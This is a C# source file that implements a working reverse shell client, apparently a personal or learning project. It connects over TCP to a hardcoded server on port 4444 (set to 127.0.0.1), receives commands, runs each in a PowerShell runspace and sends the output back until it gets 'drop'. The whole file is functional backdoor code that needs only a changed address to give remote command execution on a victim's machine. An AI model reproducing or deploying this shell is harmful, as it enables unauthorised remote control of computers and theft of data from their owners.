using System;
using System.Collections.Generic;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Collections.ObjectModel;
using System.IO;



namespace ClientShell
{
    internal class Program
    {
        public string GetResult(string cmd)
        {
            /*
             * Creates a runspace, assing a powershell, add a script from arg cmd
             * return a sting of PowerShell objects from the output.
             */
            string message_tor_return;

            //create Runspace config
            RunspaceConfiguration runs_conf = RunspaceConfiguration.Create();

            //create Runspace using Runspace factory, and use our config
            Runspace run_sp = RunspaceFactory.CreateRunspace(runs_conf);

            //open Runspace
            run_sp.Open();

            // start a new powershell
            PowerShell p_shell = PowerShell.Create();

            //assigne neew shell runspace to the one we created
            p_shell.Runspace = run_sp;

            //add script to be executed in the powershell
            p_shell.AddScript(cmd, true);

            //create a new stringWriter from System.IO to format the output on the return
            StringWriter stringWr = new StringWriter();

            // invoke will retur PowerShellObjects, take them and pass to loop
            Collection<PSObject> p_shell_obj = p_shell.Invoke();

            // take every obj returnde and write it to StringWriter
            foreach (PSObject obj in p_shell_obj)
            {
                try
                {
                    stringWr.WriteLine(obj.ToString());
                }
                catch
                {
                    // object might be null
                }
                
            }
            // send stringWriter to return message
            message_tor_return = stringWr.ToString();
            //custom message if the shell returned no objects and stringWriter had nothing to write
            if (message_tor_return == "")
            {
                return "[?!] Error: nothing to return";
            }
            return message_tor_return;
        }

        public string ClearReceiveTrimMessage(byte[] message_arr, Socket client_socket)
        {
            /*
             * Takes array of bytes and Socket
             * clears the array and receives the mesage on the socket, 
             * return string of message from teh byte[]
             */
            Array.Clear(message_arr, 0, message_arr.Length);
            client_socket.Receive(message_arr);
            //return string, trims the nullbyte at the end
            return Encoding.ASCII.GetString(message_arr).TrimEnd('\0');
        }

        static void Main(string[] args)
        {

            Program callExt = new Program(); // just to access our public methods via callEx.MethodName(args)
            string return_message; // a message to return to serverSocket

            //getting server ip address = hardcoded
            IPAddress server_ip = IPAddress.Parse("127.0.0.1");

            // defining endpoint  for the connection PORT "4444" is hardcoded
            IPEndPoint client_endpoint = new IPEndPoint(server_ip, 4444);

            //crating new clinet socket SOcketType stream, Protocol TCP 
            Socket client_socket = new Socket(server_ip.AddressFamily, SocketType.Stream, ProtocolType.Tcp);

            //connecting client socket to endpoint
            client_socket.Connect(client_endpoint);

            // creating byte array to receive mesasge
            byte[] message_b = new byte[2048];

            //Clear array, receive new message and return string without extra nullbites at the end
            string message_str = callExt.ClearReceiveTrimMessage(message_b, client_socket);

            while (message_str != "drop")
            {
                //clean thios shit up
                Console.WriteLine("Command from server: {0}", message_str);

                //passing to shell_call the message_str for the GetResult to return the output from the shell
                return_message = callExt.GetResult(message_str);
                //send the message to the Server Socket
                client_socket.Send(Encoding.ASCII.GetBytes(return_message));
                //Clear array and receive new message, return string
                message_str = callExt.ClearReceiveTrimMessage(message_b, client_socket);
            }

            //if command 'drop'  close connection
            client_socket.Close();
        }

    }
}
